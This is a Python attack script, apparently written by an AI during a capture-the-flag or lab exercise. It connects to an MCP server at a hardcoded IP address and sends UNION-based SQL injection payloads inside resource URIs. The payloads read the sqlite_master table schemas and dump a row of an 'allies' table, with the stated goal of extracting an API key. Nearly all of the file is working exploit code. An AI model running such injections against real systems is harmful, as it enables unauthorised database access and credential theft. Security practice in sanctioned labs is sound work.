#!/usr/bin/env python3
"""
Find Database Schema
Author: Claude
Purpose: Discover the allies table schema using SQL injection
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Find correct column names and extract API key
Produced Result: TBD
"""

import requests
import json

MCP_URL = "http://154.57.164.74:31735/mcp/"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        resp = requests.post(self.url, json=payload, headers=headers)
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    return json.loads(line[6:])
        return resp.json()

    def initialize(self):
        return self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "schema", "version": "1.0"}
        })

    def read_resource(self, uri):
        return self.send_request("resources/read", {"uri": uri})

client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Finding Database Schema")
print("="*60)

# Get table schema from sqlite_master
print("\n[*] Querying sqlite_master for allies table schema...")
sqli = "a' UNION SELECT sql, type, name FROM sqlite_master WHERE type='table' AND name='allies'--"
result = client.read_resource(f"ash-data://ally/status/{sqli}")
print(json.dumps(result, indent=2))

# Also try to get schema for all tables
print("\n[*] Getting all table schemas...")
sqli2 = "a' UNION SELECT name, sql, type FROM sqlite_master WHERE type='table'--"
result2 = client.read_resource(f"ash-data://ally/status/{sqli2}")
print(json.dumps(result2, indent=2))

# Try pragma table_info
print("\n[*] Trying PRAGMA approach...")
# SQLite pragma returns multiple rows, so we need a different approach

# Try extracting first row from allies table to see what columns exist
print("\n[*] Extracting first ally record...")
sqli3 = "a' UNION SELECT * FROM allies LIMIT 1--"
result3 = client.read_resource(f"ash-data://ally/status/{sqli3}")
print(json.dumps(result3, indent=2))
